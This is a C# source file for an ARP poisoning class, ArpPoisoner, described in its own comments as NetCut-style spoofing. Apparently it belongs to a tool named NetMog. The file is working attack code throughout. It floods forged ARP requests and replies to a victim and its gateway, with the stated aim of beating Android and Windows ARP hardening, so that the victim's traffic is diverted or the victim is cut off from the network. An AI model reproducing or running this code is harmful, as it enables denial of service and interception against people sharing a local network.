using System.Net;
using System.Net.NetworkInformation;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using NetMog.Models;

namespace NetMog.Core;

/// <summary>
/// ARP poisoner: classic NetCut-style spoofing via SharpPcap. Sends fake
/// ARP replies to the gateway and the victim so traffic flows through us,
/// cutting the victim off from the LAN/internet when we drop it.
/// </summary>
public sealed class ArpPoisoner : IDisposable
{
    private static readonly PhysicalAddress BroadcastMac = PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF");

    private static readonly PhysicalAddress ZeroMac = PhysicalAddress.Parse("00-00-00-00-00-00");

    private readonly NetworkInfo _net;
    // Keyed by MAC, not IP: a cut device keeps its state when DHCP hands it a
    // new lease, and the poisoner automatically targets the new address.
    private readonly Dictionary<string, DeviceInfo> _killed = new(StringComparer.OrdinalIgnoreCase);
    private readonly object _lock = new();
    private LibPcapLiveDevice? _dev;
    private Thread? _thread;
    private volatile bool _running;
    private volatile bool _defenderOn = true;

    public event Action<byte[]>? OnFrame;
    public bool DefenderOn => _defenderOn;
    public int KilledCount
    {
        get { lock (_lock) return _killed.Count; }
    }

    public ArpPoisoner(NetworkInfo net) => _net = net;

    public void Start()
    {
        lock (_lock)
        {
            if (_thread != null) return;

            try
            {
                _dev = _net.CreateDevice();
                _dev.Open(DeviceModes.Promiscuous, 250);
                _dev.OnPacketArrival += OnPacketArrival;
                _dev.StartCapture();
            }
            catch
            {
                // Capture could not be opened (driver missing/denied). Frames are
                // simply not sent; the UI still lists devices via the OS ARP stack.
            }

            _running = true;
            _thread = new Thread(Loop) { IsBackground = true, Name = "arp-poisoner" };
            _thread.Start();
        }
    }

    private void OnPacketArrival(object sender, PacketCapture e)
    {
        var h = OnFrame;
        if (h == null) return;
        try
        {
            h(e.Data.ToArray());
        }
        catch
        {
        }
    }

    public bool SendRaw(byte[] frame)
    {
        var dev = _dev;
        if (dev == null) return false;
        try
        {
            dev.SendPacket(frame, frame.Length);
            return true;
        }
        catch
        {
            return false;
        }
    }

    public void Kill(DeviceInfo dev)
    {
        lock (_lock)
        {
            if (string.IsNullOrEmpty(dev.Mac)) return;
            _killed[dev.Mac] = dev;
        }
    }

    public void Restore(DeviceInfo dev)
    {
        lock (_lock)
        {
            if (!string.IsNullOrEmpty(dev.Mac)) _killed.Remove(dev.Mac);
        }
        SendCorrect(dev);
    }

    public void RestoreAll()
    {
        List<DeviceInfo> all;
        lock (_lock)
        {
            all = _killed.Values.ToList();
            _killed.Clear();
        }
        foreach (var d in all) SendCorrect(d);
    }

    public List<(string Ip, string Mac)> KilledList()
    {
        lock (_lock) return _killed.Values.Select(d => (d.Ip, d.Mac)).ToList();
    }

    public void SetDefender(bool on) => _defenderOn = on;

    private void Loop()
    {
        while (_running)
        {
            List<DeviceInfo> targets;
            lock (_lock) targets = _killed.Values.ToList();

            foreach (var t in targets)
            {
                SendSpoof(t);
                Thread.Sleep(50);
            }

            // Defender: periodically re-assert our own ARP identity so other
            // ARP poisoners on the LAN cannot redirect our traffic.
            if (_defenderOn)
            {
                ClaimSelf();
                Thread.Sleep(50);
            }

            Thread.Sleep(targets.Count > 0 ? 300 : 1000);
        }
    }

    private void ClaimSelf()
    {
        var gwMac = _net.GatewayMac;
        var dev = _dev;
        if (gwMac == null || dev == null) return;
        try
        {
            var ourMac = _net.LocalMac;
            var ourIp = IPAddress.Parse(_net.LocalIpString);
            var gwIp = IPAddress.Parse(_net.GatewayIpString);
            // Tell the gateway our IP is at our real MAC (unicast).
            SendRawArpRequest(dev, ourMac, ourIp, gwIp, gwMac);
            // Broadcast the same claim so every LAN peer fixes its cache.
            SendRawArpRequest(dev, ourMac, ourIp, ourIp, BroadcastMac);
            // Re-teach ourselves the real gateway MAC in case we were poisoned.
            SendRawArpRequest(dev, gwMac, gwIp, ourIp, ourMac);
        }
        catch { }
    }

    private void SendSpoof(DeviceInfo t)
    {
        var gwMac = _net.GatewayMac;
        if (gwMac == null) return;
        var targetMac = NetworkInfo.ParseMacSafe(t.Mac);
        if (targetMac == null) return;
        var gwIp = IPAddress.Parse(_net.GatewayIpString);
        var victimIp = IPAddress.Parse(t.Ip);

        var dev = _dev;
        if (dev == null) return;
        try
        {
            // NetCut-style kill burst: request AND reply variants on both
            // sides. Hardened clients (Android selective-ARP, Windows ARP
            // validation) drop cache updates while their gateway entry is
            // "in use" — they only accept them while it is stale/probing.
            // Flooding every ~300ms guarantees we land inside those windows.
            var ourMac = _net.LocalMac;
            for (int i = 0; i < 3; i++)
            {
                // To the victim: "gateway IP @ our MAC, who has <victim>? tell <gateway>"
                SendRawArpRequest(dev, ourMac, gwIp, victimIp, targetMac);
                // To the victim: unsolicited reply "gateway IP @ our MAC"
                SendRawArpReply(dev, targetMac, ourMac, gwIp, targetMac, victimIp);
                // To the gateway: "victim IP @ our MAC, who has <victim>? tell <gateway>"
                SendRawArpRequest(dev, ourMac, victimIp, victimIp, gwMac);
                // To the gateway: reply "victim IP @ our MAC"
                SendRawArpReply(dev, gwMac, ourMac, victimIp, gwMac, victimIp);
                Thread.Sleep(20);
            }
        }
        catch
        {
        }
    }

    // ======== RAW ARP ========

    private void SendRawArpReply(LibPcapLiveDevice dev,
        PhysicalAddress ethDst,
        PhysicalAddress arpSenderMac, IPAddress arpSenderIp,
        PhysicalAddress arpTargetMac, IPAddress arpTargetIp)
    {
        var arp = new ArpPacket(
            ArpOperation.Response,
            arpTargetMac, arpTargetIp,
            arpSenderMac, arpSenderIp);
        SendRawFrame(dev, arpSenderMac, ethDst, arp);
    }

    private void SendRawArpRequest(LibPcapLiveDevice dev,
        PhysicalAddress arpSenderMac, IPAddress arpSenderIp,
        IPAddress arpTargetIp, PhysicalAddress ethDst)
    {
        var arp = new ArpPacket(
            ArpOperation.Request,
            ZeroMac, arpTargetIp,
            arpSenderMac, arpSenderIp);
        SendRawFrame(dev, arpSenderMac, ethDst, arp);
    }

    private void SendRawFrame(LibPcapLiveDevice dev, PhysicalAddress src, PhysicalAddress dst, ArpPacket arp)
    {
        var eth = new EthernetPacket(src, dst, EthernetType.Arp)
        {
            PayloadPacket = arp
        };
        byte[] raw = eth.Bytes;
        if (raw.Length < 60)
        {
            byte[] padded = new byte[60];
            Array.Copy(raw, padded, raw.Length);
            dev.SendPacket(padded);
        }
        else
        {
            dev.SendPacket(raw);
        }
    }

    // ======== RESTORE ========

    private void SendCorrect(DeviceInfo t)
    {
        var gwMac = _net.GatewayMac;
        if (gwMac == null) return;
        var targetMac = NetworkInfo.ParseMacSafe(t.Mac);
        if (targetMac == null) return;

        var dev = _dev;
        if (dev != null)
        {
            for (int i = 0; i < 5; i++)
            {
                try
                {
                    // To the victim: "sender = gateway IP @ real gateway MAC, who has <victim>?"
                    // -> victim learns: gateway is at its real MAC.
                    SendRawArpRequest(dev, gwMac, IPAddress.Parse(_net.GatewayIpString),
                        IPAddress.Parse(t.Ip), targetMac);
                    // To the gateway: "sender = victim IP @ real victim MAC, who has <victim>?"
                    // -> gateway learns: victim is at its real MAC.
                    SendRawArpRequest(dev, targetMac, IPAddress.Parse(t.Ip),
                        IPAddress.Parse(t.Ip), gwMac);
                }
                catch { }
                Thread.Sleep(80);
            }
        }
    }

    public void Dispose()
    {
        _running = false;
        _thread?.Join(500);
        RestoreAll();
        try
        {
            if (_dev != null)
            {
                _dev.OnPacketArrival -= OnPacketArrival;
                _dev.Close();
            }
        }
        catch { }
        _dev = null;
    }
}
